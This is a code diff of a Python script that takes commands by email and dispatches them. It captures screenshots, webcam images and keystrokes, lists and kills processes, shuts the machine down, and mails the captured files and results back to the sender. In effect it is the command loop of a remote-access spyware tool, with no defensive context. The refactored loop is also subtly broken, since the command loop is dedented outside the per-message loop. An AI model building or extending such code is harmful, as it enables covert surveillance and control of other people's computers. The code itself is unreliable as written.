@@ -1,5 +1,6 @@
 import mail_handle_receive
-import mail_handle_send
+from mail_handle_send import *
+import message_generate
 import system_control
 import datetime
 import keylogr
@@ -7,32 +8,19 @@ import resource_monitor
 import time
 import re
 import os
-import multiprocessing
-
-
-def shutdown():
-    print("Shutting down in 10 seconds")
-    system_control.countdown(10)
-    os.system("shutdown -s -t 0")
-
-
-def help():
-    pass
-
 
 function_map = {
-    'help': help,
-    'shutdown': shutdown,
+    'help': message_generate.help,
+    'shutdown': system_control.shutdown,
+    'kill_process': resource_monitor.kill_process,
     'screenshot': system_control.screenshot,
     'webcam': system_control.webcam_image,
-    # 'list_apps': resource_monitor.list_apps,
+    'keylog': keylogr.keylog,
     # 'open_app': resource_monitor.open_app,
     # 'close_app': resource_monitor.close_app,
+    'list_apps': resource_monitor.getAppInfo,
     'list_processes': resource_monitor.list_processes,
-    'kill_process': resource_monitor.kill_process,
-    'keylog': keylogr.keylog
 }
-
 
 def request_handle(msg_list):
     if msg_list == None:
@@ -40,36 +28,40 @@ def request_handle(msg_list):
     for msg in msg_list:
         recipient_mail = re.search(r'[\w\.-]+@[\w\.-]+', msg['From']).group()
         cmd_list = mail_handle_receive.decode_mail(msg)
-
-        for cmd in cmd_list:
-            try:
-                cmd = cmd.lower().strip()
-                if cmd == 'screenshot' or cmd == 'keylog' or cmd == 'webcam':
-                    filename = function_map[cmd](15)
-                    print('Saved to', filename)
-                    mail_handle_send.send_mail_success_execution(
-                        recipient_mail, cmd, filename)
-                elif cmd == 'shutdown':
-                    mail_handle_send.send_mail_success_execution(
-                        recipient_mail, cmd)
-                    function_map[cmd]()
-                elif 'kill_process' in cmd:
-                    pid_match = re.search(r'\d+', cmd)
-                    pid = pid_match.group()
-                    function_map[cmd.split(' ')[0]](int(pid))
-                else:
-                    function_map[cmd]()
-                    mail_handle_send.send_mail_success_execution(
-                        recipient_mail, cmd)
-            except Exception as e:
-                print(e)
-                mail_handle_send.send_mail_failure_execution(
-                    recipient_mail, cmd)
-
+# change cmd to message for each mail sent
+    for cmd in cmd_list:
+        try:
+            if cmd == "help":
+                message = message_generate.help()
+                send_mail_success_execution(recipient_mail, message)
+            elif cmd == "list_processes" or cmd == "list_apps":
+                data = function_map[cmd]()
+                message = message_generate.DataFormat(data)
+                send_mail_success_execution(recipient_mail,message)
+            elif cmd == "shutdown":
+                message = message_generate.success_message(cmd)
+                send_mail_success_execution(recipient_mail, message)
+                function_map[cmd]()
+            elif cmd == "keylog" or cmd == "screenshot" or cmd == "webcam":
+                filename = function_map[cmd]()
+                message = message_generate.success_message(cmd)
+                send_mail_success_execution(recipient_mail, message, filename)
+            elif cmd.startswith('kill_process'):
+                splitted = cmd.split(' ')
+                function_map[splitted[0]](int(splitted[1]))
+                message = message_generate.success_message(cmd)
+                send_mail_success_execution(recipient_mail, message)
+            else:
+                function_map[cmd]()
+                message = message_generate.success_message(cmd)
+                send_mail_success_execution(recipient_mail, message)
+        except Exception as e:
+            print(e)
+            message = message_generate.failure_message(cmd)
+            send_mail_failure_execution(recipient_mail, message)
 
 def waiting(message):
     print('', end='\r')
-    # icon = ['◢', '◣', '◤', '◥']
     icon = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
     n = len(icon)
     for i in range(n):
